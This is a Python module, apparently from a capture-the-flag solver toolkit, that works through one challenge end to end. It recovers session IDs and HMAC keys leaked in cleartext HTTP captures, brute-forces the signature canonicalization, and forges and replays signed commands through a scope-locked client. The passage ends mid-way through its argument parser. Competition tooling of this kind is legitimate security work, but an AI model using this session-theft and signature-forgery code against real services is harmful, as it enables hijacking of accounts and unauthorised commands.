#!/usr/bin/env python3
"""Offline HTTP session-theft + HMAC-replay engine.

A cleartext-HTTP challenge leaks a per-session signing key on the wire (TLS absent, the login
response hands back the session id *and* the HMAC key), and every signed command carries an
``X-Signature`` the server recomputes over a canonical signing string.  The manual solve was:
reassemble the capture, recover the session/key JSON, work out the exact signing-string
canonicalization (field order, separators, which bytes of the body, which digest, how the key is
used) from the captured signatures, then sign one fresh command and replay it against the squad's own
live instance (csctf 9112 "Hard Landing").

This module automates the scriptable part and leaves the residual to the agent:

  * ``load_capture`` takes a pcap/pcapng (reassembled and HTTP-decoded by the tree's strict stdlib
    ``solvers/toolkits/network_forensics.py``) or a reassembled cleartext HTTP text capture
    (``parse_http_capture``, which also accepts LF-only hand-copied text).
  * ``extract_session_material`` pulls the session/key JSON out of a (optionally gzip) response body.
  * ``extract_signed_requests`` pulls the signed command requests (method/path/timestamp/sig/body).
  * ``infer_template`` brutes a BOUNDED space of HMAC signing templates against the captured signed
    requests until one reproduces every captured signature.  An exotic canonicalization outside the
    searched field-orders / separators / digests / key-forms is reported as "not inferred" for the
    agent to model by hand -- never guessed (the spec's residual blocker).
  * ``sign_command`` exposes a signer for a fresh command (re-verifies its own output).
  * ``send_signed_command`` replays one signed command through the single scope-locked, event-gated
    live client (``solvers.toolkits.web.WebClient``) -- the only road to the wire.

The HMAC template follows the same stages as ``aws_sigv4.py`` (canonical signing string -> string to
sign -> signing key -> signature -> constant-time verify); the difference is that here the
canonicalization is unknown up front, so ``infer_template`` searches the template space instead of
hard-coding AWS's fixed scheme.

It opens no socket of its own, never prints or writes the recovered key (only a redacted fingerprint),
and submits nothing.  Challenge captures are untrusted data: the parser only decodes and ``json.loads``
them, never executes anything found inside.
"""
from __future__ import annotations

import argparse
import base64
import binascii
import dataclasses
import hashlib
import hmac
import itertools
import json
import sys
import zlib
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterable, Sequence

_REPO_ROOT = Path(__file__).resolve().parents[2]

MAX_CAPTURE = 64 << 20   # refuse an absurd capture (64 MiB)
MAX_BODY = 8 << 20       # refuse an absurd single message body
MAX_MESSAGES = 10000     # refuse a pathological message count

# The bounded template search space.  Each axis is small and named so the search stays fast and the
# result is explainable; a scheme outside it is reported "not inferred", never guessed.
_VOCAB = ("method", "target", "timestamp", "body", "session")
_SEPARATORS = ("\n", "", "|", ":", " ", "&")
_DIGESTS = ("sha256", "sha1", "sha512", "md5")
_KEY_FORMS = ("utf8", "hex", "base64")
_BODY_FORMS = ("raw", "compact_json")
_TARGET_FORMS = ("path", "path_query")

_DIGEST_FUNCS = {
    "sha256": hashlib.sha256,
    "sha1": hashlib.sha1,
    "sha512": hashlib.sha512,
    "md5": hashlib.md5,
}


class ReplayError(Exception):
    """Malformed input or an unsupported option -- fail closed, never emit an unchecked value."""


# --------------------------------------------------------------------------- key material handling
def _key_bytes(key_material: str, key_form: str) -> bytes | None:
    """Turn a recovered key string into raw bytes under one interpretation. ``None`` = not that form."""
    if isinstance(key_material, bytes):
        text = key_material.decode("latin-1")
    else:
        text = str(key_material)
    if key_form == "utf8":
        return text.encode("utf-8")
    if key_form == "hex":
        t = text.strip()
        if len(t) % 2 or not t:
            return None
        try:
            return bytes.fromhex(t)
        except ValueError:
            return None
    if key_form == "base64":
        t = text.strip()
        try:
            raw = base64.b64decode(t, validate=True)
        except (binascii.Error, ValueError):
            return None
        if not raw:
            return None
        return raw
    raise ReplayError(f"unknown key_form {key_form!r}")


def _compact_json(body: bytes) -> bytes | None:
    """Re-serialise a JSON body to compact form (``separators=(',',':')``). ``None`` = not JSON."""
    try:
        obj = json.loads(body.decode("utf-8"))
    except (ValueError, UnicodeDecodeError):
        return None
    try:
        return json.dumps(obj, separators=(",", ":"), sort_keys=False).encode("utf-8")
    except (TypeError, ValueError):
        return None


# ------------------------------------------------------------------------------- the signed request
@dataclass
class SignedRequest:
    """One captured (or to-be-signed) command request.

    ``signature`` is the hex MAC the capture carried (lower-cased); empty when building a fresh one.
    ``query`` is the raw query string with no leading ``?``.
    """
    method: str
    path: str
    query: str = ""
    body: bytes = b""
    timestamp: str = ""
    session: str = ""
    host: str = ""
    signature: str = ""

    def target(self, target_form: str) -> str:
        if target_form == "path_query" and self.query:
            return f"{self.path}?{self.query}"
        return self.path


# ------------------------------------------------------------------------------------ HMAC template
@dataclass(frozen=True)
class HmacTemplate:
    """A candidate HMAC signing scheme: ordered components joined by a separator, keyed and digested.

    Stages mirror ``aws_sigv4.py``: ``signing_string`` is the canonical request / string-to-sign,
    ``signing_key`` derives the key bytes, ``sign`` is the signature, ``verify`` the constant-time
    check.  Unlike SigV4 the field order/separator/digest/key-form are not fixed -- they are what
    ``infer_template`` recovered from the captures.  ``aws_sigv4`` is deliberately not imported: its
    HMAC stage is fixed to SHA-256 over a UTF-8 ``str`` with a date-scoped derived key, while this
    template needs a selectable digest, a raw-bytes signing string (non-UTF-8 bodies) and the key used
    as recovered; both end in the same ``hmac.compare_digest`` constant-time verify.
    """
    fields: tuple[str, ...]
    separator: str
    digest: str
    key_form: str
    body_form: str
    target_form: str

    def _component(self, name: str, req: SignedRequest) -> bytes:
        if name == "method":
            return req.method.upper().encode("utf-8")
        if name == "target":
            return req.target(self.target_form).encode("utf-8")
        if name == "timestamp":
            return req.timestamp.encode("utf-8")
        if name == "session":
            return req.session.encode("utf-8")
        if name == "body":
            if self.body_form == "compact_json":
                compact = _compact_json(req.body)
                if compact is not None:
                    return compact
            return req.body
        raise ReplayError(f"unknown signing component {name!r}")

    def signing_string(self, req: SignedRequest) -> bytes:
        sep = self.separator.encode("utf-8")
        return sep.join(self._component(name, req) for name in self.fields)

    def signing_key(self, key_material: str) -> bytes:
        key = _key_bytes(key_material, self.key_form)
        if key is None:
            raise ReplayError(f"key is not valid {self.key_form}")
        return key

    def sign(self, key_material: str, req: SignedRequest) -> str:
        func = _DIGEST_FUNCS[self.digest]
        return hmac.new(self.signing_key(key_material), self.signing_string(req), func).hexdigest()

    def verify(self, key_material: str, req: SignedRequest, claimed: str) -> bool:
        try:
            got = self.sign(key_material, req)
        except ReplayError:
            return False
        return hmac.compare_digest(got, (claimed or "").strip().lower())

    def describe(self) -> str:
        shown = self.separator.replace("\n", "\\n") or "<empty>"
        key_note = {"utf8": "raw UTF-8", "hex": "hex-decoded", "base64": "base64-decoded"}[self.key_form]
        return (f"HMAC-{self.digest.upper()} over [{' '.join(self.fields)}] joined by {shown!r} "
                f"(key: {key_note}, body: {self.body_form}, target: {self.target_form})")


def _applicable(pairs: Sequence[tuple[SignedRequest, str]]) -> dict:
    """Trim each search axis to values that could plausibly fit the captured requests."""
    reqs = [r for r, _ in pairs]
    keys = [k for _, k in pairs]
    # components: method/target/timestamp/body are always present; session only if some request has one.
    vocab = ["method", "target", "timestamp", "body"]
    if any(r.session for r in reqs):
        vocab.append("session")
    # body_form: compact_json only if every body parses as JSON and the compaction changes at least one.
    body_forms = ["raw"]
    compacts = [_compact_json(r.body) for r in reqs]
    if all(c is not None for c in compacts) and any(c != r.body for c, r in zip(compacts, reqs)):
        body_forms.append("compact_json")
    # key_form: utf8 always; hex/base64 only when every key decodes under that form.
    key_forms = ["utf8"]
    if all(_key_bytes(k, "hex") is not None for k in keys):
        key_forms.append("hex")
    if all(_key_bytes(k, "base64") is not None for k in keys):
        key_forms.append("base64")
    # target_form: path_query only when some request actually has a query string.
    target_forms = ["path"]
    if any(r.query for r in reqs):
        target_forms.append("path_query")
    return {"vocab": vocab, "body_forms": body_forms, "key_forms": key_forms,
            "target_forms": target_forms}


def _candidate_templates(axes: dict) -> Iterable[HmacTemplate]:
    vocab = axes["vocab"]
    orders: list[tuple[str, ...]] = []
    for size in range(2, len(vocab) + 1):
        for combo in itertools.combinations(vocab, size):
            orders.extend(itertools.permutations(combo))
    for fields in orders:
        for sep in _SEPARATORS:
            for digest in _DIGESTS:
                for key_form in axes["key_forms"]:
                    for body_form in axes["body_forms"]:
                        # body_form only matters when body is a component.
                        if body_form == "compact_json" and "body" not in fields:
                            continue
                        for target_form in axes["target_forms"]:
                            if target_form == "path_query" and "target" not in fields:
                                continue
                            yield HmacTemplate(tuple(fields), sep, digest, key_form,
                                               body_form, target_form)


def infer_template(pairs: Sequence[tuple[SignedRequest, str]]) -> list[HmacTemplate]:
    """Brute the bounded template space for every scheme that reproduces ALL captured signatures.

    ``pairs`` are (request, key_material) -- each captured signed request paired with the key that
    signed it (different sessions have different keys).  Returns every ``HmacTemplate`` whose signature
    equals the captured one for every pair, in a deterministic order.  An empty list means no scheme in
    the searched space fits: the caller reports that the canonicalization needs the agent, and never
    guesses.  Raises ``ReplayError`` if no pair carries a signature to check against.
    """
    pairs = [(r, k) for r, k in pairs if r.signature]
    if not pairs:
        raise ReplayError("no captured signed request to infer from (none carried a signature)")
    axes = _applicable(pairs)
    first_req, first_key = pairs[0]
    rest = pairs[1:]
    survivors: list[HmacTemplate] = []
    for tmpl in _candidate_templates(axes):
        # Prune on the first request: most candidates die here, so this is the hot path.
        if not tmpl.verify(first_key, first_req, first_req.signature):
            continue
        if all(tmpl.verify(k, r, r.signature) for r, k in rest):
            survivors.append(tmpl)
    return survivors


# ------------------------------------------------------------------------------ the signer + replay
@dataclass
class SignedCommand:
    """A fresh signed command, ready for the operator or ``send_signed_command`` to put on the wire."""
    method: str
    target: str
    body: bytes
    headers: dict
    template: HmacTemplate


def sign_command(template: HmacTemplate, key_material: str, *, method: str, path: str,
                 body: bytes | str = b"", timestamp: str = "", query: str = "", session: str = "",
                 sig_header: str = "X-Signature", ts_header: str = "X-Timestamp",
                 session_header: str = "X-Session", extra_headers: dict | None = None) -> SignedCommand:
    """Sign one fresh command with a recovered template + key. Re-verifies its own output.

    Returns the HTTP method, request target, body bytes and the headers to set (signature, timestamp
    and -- when a session is given -- the session header).  The recovered key never appears in the
    output.  Raises ``ReplayError`` on self-verification failure rather than emitting an unchecked MAC.
    """
    raw = body.encode("utf-8") if isinstance(body, str) else bytes(body)
    req = SignedRequest(method=method, path=path, query=query, body=raw,
                        timestamp=str(timestamp), session=session)
    sig = template.sign(key_material, req)
    if not template.verify(key_material, req, sig):
        raise ReplayError("self-verification failed (recomputed signature did not match)")
    headers = {sig_header: sig}
    if timestamp != "":
        headers[ts_header] = str(timestamp)
    if session:
        headers[session_header] = session
    if extra_headers:
        headers.update(extra_headers)
    return SignedCommand(method=method.upper(), target=req.target("path_query"),
                         body=raw, headers=headers, template=template)


def send_signed_command(client, signed: SignedCommand, *, allow_redirects: bool = True) -> dict:
    """Replay one signed command through a scope-locked, event-gated ``WebClient`` (the only wire road).

    ``client`` is a ``solvers.toolkits.web.WebClient`` the caller already built against the squad's one
    assigned target (its constructor runs the live-service scope guard, and a ``get_only`` client --
    the web lane's default until the event profile authorises state-changing actions, Open O-2 --
    refuses the non-GET method before it reaches the wire).  This helper does not relax any of that: it
    passes the signed method/body/headers straight to ``client.request`` and returns its response dict.
    A scope or policy refusal from the client propagates unchanged.
    """
    return client.request(signed.method, signed.target, data=signed.body,
                          headers=dict(signed.headers), allow_redirects=allow_redirects)


# --------------------------------------------------------------------------------- capture parsing
@dataclass
class HttpMessage:
    kind: str                      # "request" or "response"
    method: str = ""
    path: str = ""
    query: str = ""
    version: str = ""
    status: int = 0
    reason: str = ""
    headers: list = field(default_factory=list)   # list[tuple[str, str]], order preserved
    body: bytes = b""              # body bytes exactly as framed (still content-encoded)

    def header(self, name: str) -> str | None:
        low = name.lower()
        for k, v in self.headers:
            if k.lower() == low:
                return v
        return None

    def decoded_body(self) -> bytes:
        """The body with Content-Encoding (gzip/deflate) removed, for JSON extraction.

        A body that claims an encoding but does not decode, or an encoding this engine does not
        handle, raises ``ReplayError`` with a named reason -- never the raw bytes passed off as decoded.
        """
        enc = (self.header("content-encoding") or "").strip().lower()
        if not self.body or enc in ("", "identity"):
            return self.body
        if enc in ("gzip", "x-gzip"):
            try:
                return zlib.decompress(self.body, 47)   # 47 = auto-detect gzip/zlib header
            except zlib.error as exc:
                raise ReplayError(f"corrupt gzip body ({exc})") from None
        if enc == "deflate":
            for wbits in (15, -15):                     # zlib-wrapped, then raw deflate
                try:
                    return zlib.decompress(self.body, wbits)
                except zlib.error:
                    continue
            raise ReplayError("corrupt deflate body (neither zlib-wrapped nor raw deflate)")
        raise ReplayError(f"unsupported Content-Encoding {enc!r} (gzip/deflate only)")


def _split_head(buf: bytes) -> tuple[bytes, bytes] | None:
    i = buf.find(b"\r\n\r\n")
    if i != -1:
        return buf[:i], buf[i + 4:]
    i = buf.find(b"\n\n")
    if i != -1:
        return buf[:i], buf[i + 2:]
    return None


def _parse_headers(head: bytes) -> tuple[bytes, list]:
    lines = head.replace(b"\r\n", b"\n").split(b"\n")
    start = lines[0]
    headers: list = []
    for line in lines[1:]:
        if not line:
            continue
        if b":" not in line:
            continue
        name, _, value = line.partition(b":")
        headers.append((name.decode("latin-1").strip(), value.decode("latin-1").strip()))
    return start, headers


def _dechunk(buf: bytes) -> tuple[bytes, bytes] | None:
    """Decode a chunked body. Returns (body, rest) or None when the buffer is incomplete."""
    out = bytearray()
    rest = buf
    while True:
        nl = rest.find(b"\r\n")
        sep = 2
        if nl == -1:
            nl = rest.find(b"\n")
            sep = 1
            if nl == -1:
                return None
        size_line = rest[:nl].split(b";", 1)[0].strip()
        try:
            size = int(size_line, 16)
        except ValueError:
            return None
        rest = rest[nl + sep:]
        if size == 0:
            # consume an optional trailing CRLF
            if rest.startswith(b"\r\n"):
                rest = rest[2:]
            elif rest.startswith(b"\n"):
                rest = rest[1:]
            return bytes(out), rest
        if len(rest) < size:
            return None
        out += rest[:size]
        rest = rest[size:]
        if rest.startswith(b"\r\n"):
            rest = rest[2:]
        elif rest.startswith(b"\n"):
            rest = rest[1:]


_START_MARKERS = (b"HTTP/", b"GET ", b"POST ", b"PUT ", b"DELETE ", b"PATCH ", b"HEAD ", b"OPTIONS ")


def _next_message_offset(buf: bytes) -> int:
    """Index of the next plausible HTTP start-line in buf, or len(buf) if none.

    A start-line at offset 0 counts (the previous unframed message simply had no body), so a
    body-less unframed response never swallows the message that immediately follows it.
    """
    if any(buf.startswith(m) for m in _START_MARKERS):
        return 0
    best = len(buf)
    for marker in _START_MARKERS:
        i = buf.find(b"\n" + marker)
        if i != -1 and i + 1 < best:
            best = i + 1
    return best


_PCAP_MAGICS = (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4", b"\x4d\x3c\xb2\xa1", b"\xa1\xb2\x3c\x4d")
_PCAPNG_MAGIC = b"\x0a\x0d\x0d\x0a"


def capture_kind(data: bytes) -> str:
    """``"pcap"``, ``"pcapng"`` or ``"http"`` from the leading magic bytes."""
    if data[:4] in _PCAP_MAGICS:
        return "pcap"
    if data[:4] == _PCAPNG_MAGIC:
        return "pcapng"
    return "http"


def _is_start_line(buf: bytes) -> bool:
    return any(buf.startswith(m) for m in _START_MARKERS)


def parse_http_capture(data: bytes) -> list[HttpMessage]:
    """Parse a reassembled cleartext HTTP capture (concatenated request/response messages).

    Framing: each body length comes from ``Content-Length`` or ``Transfer-Encoding: chunked``; a
    message with neither takes no body (so an unframed response does not swallow the next message).
    Anything that is not HTTP where a message should start, a truncated head or body, an invalid or
    oversized ``Content-Length``, too many messages, and a pcap/pcapng file (use ``load_capture``)
    raise ``ReplayError`` with a named reason -- a malformed capture is never quietly cut short.
    Untrusted data -- it is only parsed, never executed.
    """
    if isinstance(data, str):
        data = data.encode("utf-8")
    if len(data) > MAX_CAPTURE:
        raise ReplayError("capture too large")
    kind = capture_kind(data)
    if kind != "http":
        raise ReplayError(f"input is a {kind} file, not reassembled HTTP text: use load_capture()")
    messages: list[HttpMessage] = []
    buf = data
    while True:
        buf = buf.lstrip(b"\r\n")
        if not buf.strip():
            break
        offset = len(data) - len(buf)
        if len(messages) >= MAX_MESSAGES:
            raise ReplayError(f"more than {MAX_MESSAGES} HTTP messages in the capture")
        if not _is_start_line(buf):
            raise ReplayError(f"not an HTTP start-line at byte {offset} (got {buf[:16]!r}); "
                              "the input is not a reassembled HTTP capture")
        split = _split_head(buf)
        if split is None:
            raise ReplayError(f"truncated HTTP message head at byte {offset} (no blank line)")
        head, after = split
        start, headers = _parse_headers(head)
        parts = start.split(None, 2)
        if start.startswith(b"HTTP/"):
            msg = HttpMessage(kind="response")
            msg.version = parts[0].decode("latin-1") if parts else ""
            try:
                msg.status = int(parts[1]) if len(parts) > 1 else 0
            except ValueError:
                msg.status = 0
            msg.reason = parts[2].decode("latin-1") if len(parts) > 2 else ""
        elif len(parts) >= 2 and parts[-1].startswith(b"HTTP/"):
            msg = HttpMessage(kind="request")
            msg.method = parts[0].decode("latin-1")
            target = parts[1].decode("latin-1")
            msg.path, _, msg.query = target.partition("?")
            msg.version = parts[2].decode("latin-1") if len(parts) > 2 else ""
        else:
            raise ReplayError(f"malformed HTTP start-line at byte {offset}: {start[:60]!r}")
        msg.headers = headers
        te = (msg.header("transfer-encoding") or "").lower()
        cl = msg.header("content-length")
        if "chunked" in te:
            dech = _dechunk(after)
            if dech is None:
                raise ReplayError(f"truncated or malformed chunked body in the message at byte {offset}")
            msg.body, buf = dech
            if len(msg.body) > MAX_BODY:
                raise ReplayError(f"body over {MAX_BODY} bytes in the message at byte {offset}")
        elif cl is not None:
            if not cl.strip().isdigit():
                raise ReplayError(f"invalid Content-Length {cl!r} in the message at byte {offset}")
            length = int(cl.strip())
            if length > MAX_BODY:
                raise ReplayError(f"Content-Length {length} over the {MAX_BODY}-byte body limit "
                                  f"in the message at byte {offset}")
            if length > len(after):
                raise ReplayError(f"truncated body in the message at byte {offset}: "
                                  f"Content-Length {length}, {len(after)} byte(s) present")
            msg.body = after[:length]
            buf = after[length:]
        else:
            # No declared framing: the body runs to the next start-line (offset 0 = no body), so an
            # unframed response never eats the message that follows it.
            end = _next_message_offset(after)
            if end > MAX_BODY:
                raise ReplayError(f"unframed body over {MAX_BODY} bytes in the message at byte {offset}")
            msg.body = after[:end]
            buf = after[end:]
        messages.append(msg)
    return messages


def _forensics_module():
    """The tree's strict stdlib pcap/TCP/HTTP decoder (``solvers/toolkits/network_forensics.py``)."""
    try:
        from solvers.toolkits import network_forensics as nf
    except ImportError:
        root = str(_REPO_ROOT)
        if root not in sys.path:
            sys.path.append(root)
        from solvers.toolkits import network_forensics as nf
    return nf


def _from_forensics(m) -> HttpMessage:
    """Map a ``network_forensics.HTTPMessage`` onto this engine's ``HttpMessage``."""
    msg = HttpMessage(kind=m.kind, version=f"HTTP/{m.version}", headers=list(m.headers),
                      body=m.raw_body)   # raw_body = transfer-decoded, still content-encoded
    if m.kind == "request":
        msg.method = m.method or ""
        msg.path, _, msg.query = (m.target or "").partition("?")
    else:
        msg.status = m.status or 0
        msg.reason = m.reason or ""
    return msg


def parse_pcap_capture(data: bytes) -> list[HttpMessage]:
    """Reassemble a pcap/pcapng and decode its HTTP/1 streams (reuses ``network_forensics``).

    ``reassemble_tcp`` strictly rebuilds every TCP direction; each direction that opens with an HTTP
    start-line is decoded by ``decode_http_stream``.  A capture that cannot be reassembled, an HTTP
    direction that does not decode, or a capture with no HTTP direction at all raises ``ReplayError``
    with the reason.  Directions that are not HTTP (other TCP protocols) are not this engine's input
    and are left out.  Messages come back ordered by each direction's first packet time.
    """
    if len(data) > MAX_CAPTURE:
        raise ReplayError("capture too large")
    kind = capture_kind(data)
    if kind == "http":
        raise ReplayError("input is not a pcap/pcapng file (no capture magic)")
    nf = _forensics_module()
    streams = nf.reassemble_tcp(data)
    if streams is None:
        raise ReplayError(f"{kind} could not be strictly reassembled (malformed, gapped or "
                          "conflicting TCP, or no payload-bearing TCP stream)")
    ordered = sorted(enumerate(streams), key=lambda it: (
        it[1].first_timestamp_ns is None, it[1].first_timestamp_ns or 0, it[0]))
    messages: list[HttpMessage] = []
    http_streams = 0
    for index, stream in ordered:
        if not _is_start_line(stream.data):
            continue
        http_streams += 1
        decoded = nf.decode_http_stream(stream.data, eof=stream.fin)
        if decoded is None:
            raise ReplayError(f"{kind} TCP stream #{index} looks like HTTP but does not decode as "
                              "strict HTTP/1.x (truncated, mis-framed or corrupt body)")
        messages.extend(_from_forensics(m) for m in decoded)
    if not http_streams:
        raise ReplayError(f"{kind} holds {len(streams)} TCP stream(s) but none is HTTP/1.x")
    if len(messages) > MAX_MESSAGES:
        raise ReplayError(f"more than {MAX_MESSAGES} HTTP messages in the capture")
    return messages


def load_capture(data: bytes) -> list[HttpMessage]:
    """Parse any supported capture: pcap/pcapng (by magic) or reassembled cleartext HTTP text."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    if capture_kind(data) == "http":
        return parse_http_capture(data)
    return parse_pcap_capture(data)


# ------------------------------------------------------------------ session material + request pull
_DEFAULT_KEY_FIELDS = ("key", "signing_key", "secret", "hmac_key", "session_key")
_DEFAULT_SESSION_FIELDS = ("session", "session_id", "sid")


def _json_objects(raw: bytes) -> list[dict]:
    """Every top-level JSON object in a body: the whole body, else balanced ``{...}`` spans."""
    text = raw.decode("utf-8", "replace")
    found: list[dict] = []
    stripped = text.strip()
    try:
        obj = json.loads(stripped)
        if isinstance(obj, dict):
            return [obj]
    except ValueError:
        pass
    depth = 0
    start = -1
    for i, ch in enumerate(text):
        if ch == "{":
            if depth == 0:
                start = i
            depth += 1
        elif ch == "}":
            if depth > 0:
                depth -= 1
                if depth == 0 and start != -1:
                    try:
                        obj = json.loads(text[start:i + 1])
                    except ValueError:
                        obj = None
                    if isinstance(obj, dict):
                        found.append(obj)
                    start = -1
    return found


def extract_session_material(messages: Sequence[HttpMessage], *,
                             key_fields: Sequence[str] = _DEFAULT_KEY_FIELDS,
                             session_fields: Sequence[str] = _DEFAULT_SESSION_FIELDS) -> list[dict]:
    """Every JSON object in a message body that carries a signing key (the session-theft leak).

    Returns the parsed objects (each holds the session id, key and whatever else the body carried).
    Bodies are gzip-decoded first.  The key stays inside the returned dict -- callers must not print it.
    """
    out: list[dict] = []
    seen: list[dict] = []
    for msg in messages:
        for obj in _json_objects(msg.decoded_body()):
            if any(f in obj for f in key_fields) and obj not in seen:
                seen.append(obj)
                out.append(obj)
    return out


def extract_signed_requests(messages: Sequence[HttpMessage], *, sig_header: str = "X-Signature",
                            ts_header: str = "X-Timestamp",
                            session_header: str = "X-Session") -> list[SignedRequest]:
    """Every request message that carries a signature header, as a ``SignedRequest``."""
    out: list[SignedRequest] = []
    for msg in messages:
        if msg.kind != "request":
            continue
        sig = msg.header(sig_header)
        if not sig:
            continue
        out.append(SignedRequest(
            method=msg.method, path=msg.path, query=msg.query, body=msg.body,
            timestamp=(msg.header(ts_header) or ""), session=(msg.header(session_header) or ""),
            host=(msg.header("host") or ""), signature=sig.strip().lower()))
    return out


def _session_value(obj: dict, session_fields: Sequence[str]) -> str | None:
    for f in session_fields:
        if f in obj and isinstance(obj[f], (str, int)):
            return str(obj[f])
    return None


def _key_value(obj: dict, key_fields: Sequence[str]) -> str | None:
    for f in key_fields:
        if f in obj and isinstance(obj[f], (str, int)):
            return str(obj[f])
    return None


def pair_requests_with_keys(material: Sequence[dict], requests: Sequence[SignedRequest], *,
                            key_fields: Sequence[str] = _DEFAULT_KEY_FIELDS,
                            session_fields: Sequence[str] = _DEFAULT_SESSION_FIELDS
                            ) -> tuple[list[tuple[SignedRequest, str]], list[SignedRequest]]:
    """Pair each signed request with the key of its session. Returns (pairs, unpaired_requests)."""
    by_session: dict[str, str] = {}
    lone_key: str | None = None
    for obj in material:
        key = _key_value(obj, key_fields)
        if key is None:
            continue
        sess = _session_value(obj, session_fields)
        if sess is not None:
            by_session[sess] = key
        lone_key = key
    pairs: list[tuple[SignedRequest, str]] = []
    unpaired: list[SignedRequest] = []
    for req in requests:
        key = by_session.get(req.session)
        if key is None and not by_session and lone_key is not None:
            key = lone_key   # keys recovered but none tied to a session id: the lone key signs all
        if key is None:
            unpaired.append(req)
        else:
            pairs.append((req, key))
    return pairs, unpaired


@dataclass
class Recovery:
    material: list
    signed_requests: list
    pairs: list
    unpaired: list
    templates: list


def recover(capture: bytes, *, key_fields: Sequence[str] = _DEFAULT_KEY_FIELDS,
            session_fields: Sequence[str] = _DEFAULT_SESSION_FIELDS, sig_header: str = "X-Signature",
            ts_header: str = "X-Timestamp", session_header: str = "X-Session") -> Recovery:
    """Full offline recovery from a capture: material, signed requests, pairing, inferred templates."""
    messages = load_capture(capture)
    material = extract_session_material(messages, key_fields=key_fields, session_fields=session_fields)
    requests = extract_signed_requests(messages, sig_header=sig_header, ts_header=ts_header,
                                       session_header=session_header)
    pairs, unpaired = pair_requests_with_keys(material, requests, key_fields=key_fields,
                                              session_fields=session_fields)
    templates = infer_template(pairs) if pairs else []
    return Recovery(material=material, signed_requests=requests, pairs=pairs,
                    unpaired=unpaired, templates=templates)


# ----------------------------------------------------------------------------------------- redaction
def key_fingerprint(key_material: str) -> str:
    """A non-reversible fingerprint of a recovered key, safe to print (never the key itself)."""
    if isinstance(key_material, bytes):
        raw = key_material
    else:
        raw = str(key_material).encode("utf-8")
    return f"sha256:{hashlib.sha256(raw).hexdigest()[:12]} ({len(raw)} key-chars)"


# ----------------------------------------------------------------------------------------------- CLI
def _read_capture(path: str) -> bytes:
    with open(path, "rb") as fh:
        return fh.read(MAX_CAPTURE + 1)


def _cmd_inspect(a) -> int:
    rec = recover(_read_capture(a.capture), sig_header=a.sig_header, ts_header=a.ts_header,
                  session_header=a.session_header)
    print(f"session material: {len(rec.material)} object(s) carrying a signing key")
    for obj in rec.material:
        sess = _session_value(obj, _DEFAULT_SESSION_FIELDS)
        role = obj.get("role", "")
        key = _key_value(obj, _DEFAULT_KEY_FIELDS)
        fp = key_fingerprint(key) if key is not None else "<no key field>"
        print(f"  session={sess!r} role={role!r} key={fp}")   # key is redacted, never printed
    print(f"signed requests: {len(rec.signed_requests)} captured, {len(rec.pairs)} paired with a key")
    for req in rec.signed_requests:
        print(f"  {req.method} {req.path} ts={req.timestamp} session={req.session!r} "
              f"sig={req.signature[:12]}...")
    if not rec.pairs:
        print("inference: SKIPPED (no signed request could be paired with a recovered key)")
        return 1
    if not rec.templates:
        print("inference: NOT INFERRED -- no scheme in the searched space reproduced the captures; "
              "the canonicalization needs the agent (see module docstring).")
        return 1
    print(f"inference: {len(rec.templates)} template(s) reproduce every captured signature")
    for tmpl in rec.templates:
        print(f"  {tmpl.describe()}")
    return 0


def _pick_session_and_key(rec: Recovery, wanted: str | None) -> tuple[str, str | None, str]:
    """Choose (session, key, reason) for a fresh signed command; key is None with the reason on refusal.

    Keys tied to session ids: the one session (or ``wanted``) picks its key.  Keys with no session id
    at all (the lone-key case ``pair_requests_with_keys`` pairs): the one key that signed the captured
    requests is used, and the session header is ``wanted``, else the one session value the captured
    requests carried, else none.
    """
    by_session: dict[str, str] = {}
    for obj in rec.material:
        sess, k = _session_value(obj, _DEFAULT_SESSION_FIELDS), _key_value(obj, _DEFAULT_KEY_FIELDS)
        if sess is not None and k is not None:
            by_session[sess] = k
    if by_session:
        session = wanted
        if session is None:
            if len(by_session) != 1:
                return "", None, f"multiple sessions recovered {sorted(by_session)}; pass --session"
            session = next(iter(by_session))
        if session not in by_session:
            return session, None, f"no key recovered for session {session!r}"
        return session, by_session[session], ""
    keys = {k for _, k in rec.pairs}
    if len(keys) != 1:
        return "", None, (f"no session id recovered and {len(keys)} keys signed the captured requests; "
                          "cannot tell which key to sign with")
    if wanted is not None:
        return wanted, next(iter(keys)), ""
    seen = {r.session for r, _ in rec.pairs if r.session}
    if len(seen) > 1:
        return "", None, (f"no session id recovered and the captured requests carried {len(seen)} "
                          "session values; pass --session")
    return (next(iter(seen)) if seen else ""), next(iter(keys)), ""


def _cmd_solve(a) -> int:
    rec = recover(_read_capture(a.capture), sig_header=a.sig_header, ts_header=a.ts_header,
                  session_header=a.session_header)
    if not rec.pairs:
        print("session_replay: no signed request could be paired with a recovered key", file=sys.stderr)
        return 1
    if not rec.templates:
        print("session_replay: canonicalization NOT INFERRED in the searched space -- the agent must "
              "model it by hand (see module docstring)", file=sys.stderr)
        return 1
    if len(rec.templates) > 1:
        print(f"session_replay: {len(rec.templates)} templates fit the captures (under-determined); "
              "add more captured requests or disambiguate. Candidates:", file=sys.stderr)
        for tmpl in rec.templates:
            print(f"  {tmpl.describe()}", file=sys.stderr)
        return 1
    template = rec.templates[0]
    # Pick the session + key to sign the fresh command with.
    session, key, why = _pick_session_and_key(rec, a.session)
    if key is None:
        print(f"session_replay: {why}", file=sys.stderr)
        return 1
    try:
        signed = sign_command(template, key, method=a.method, path=a.path, query=a.query,
                              body=a.command_body, timestamp=a.timestamp, session=session,
                              sig_header=a.sig_header, ts_header=a.ts_header,
                              session_header=a.session_header)
    except ReplayError as exc:
        print(f"session_replay: {exc}", file=sys.stderr)
        return 1
    if a.json:
        print(json.dumps({"method": signed.method, "target": signed.target,
                          "headers": signed.headers, "body": signed.body.decode("utf-8", "replace"),
                          "template": signed.template.describe()}, indent=1))
    else:
        print(f"template: {signed.template.describe()}")
        print(f"request:  {signed.method} {signed.target}")
        for k, v in signed.headers.items():
            print(f"header:   {k}: {v}")
        print(f"body:     {signed.body.decode('utf-8', 'replace')}")
        print("# send this against the squad's own assigned instance via the event-gated WebClient; "
              "the recovered key is never printed.")
    return 0


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Offline HTTP session-theft + HMAC-replay: recover a session/key from a cleartext "
                    "capture, infer the signing canonicalization, and sign a fresh command (offline).")
    p.add_argument("--sig-header", default="X-Signature")
    p.add_argument("--ts-header", default="X-Timestamp")
    p.add_argument("--session-header", default="X-Session")
    sub = p.add_subparsers(dest="mode", required=True)

    ins = sub.add_parser("inspect", help="parse a capture; report material, signed requests, template")
